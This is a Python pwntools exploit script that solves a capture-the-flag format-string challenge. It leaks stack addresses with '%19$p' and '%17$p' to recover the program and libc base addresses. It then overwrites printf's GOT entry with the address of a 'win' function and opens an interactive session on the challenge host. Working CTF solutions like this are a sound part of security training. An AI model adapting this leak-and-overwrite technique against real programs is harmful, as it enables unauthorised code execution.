#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall')
libc=elf.libc
local = True
GDBSCPT = '''
b* main+153
'''
OFFSET = 6
context.log_level="debug"
if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'fmt2.hackini24.shellmates.club'
    port = 443
    conn = remote(host,port,ssl=True)

# get the address of main
conn.recv()
conn.sendline(b"%19$p")
MAIN = int(conn.recvline().decode(),16)
ELF_OFFSET = MAIN - elf.symbols["main"] 
elf.address = ELF_OFFSET

log.info(f"elf @ {hex(elf.address)}")

#get the address of __libc_start_main
conn.recv()
conn.sendline(b'%17$p')
LIBC_START_MAIN = int(conn.recvline(),16)
LIBC_START_MAIN_OFF = libc.sym['__libc_start_main']
libc.address= LIBC_START_MAIN - LIBC_START_MAIN_OFF

log.info(f"libc @ {hex(libc.address)}")


# get the address of win  
WIN = elf.symbols["win"]
log.info(f"win @ {hex(WIN)}")

payload = fmtstr_payload(OFFSET, {elf.got['printf']: WIN},write_size="short")
conn.sendline(payload)

conn.interactive()
conn.close()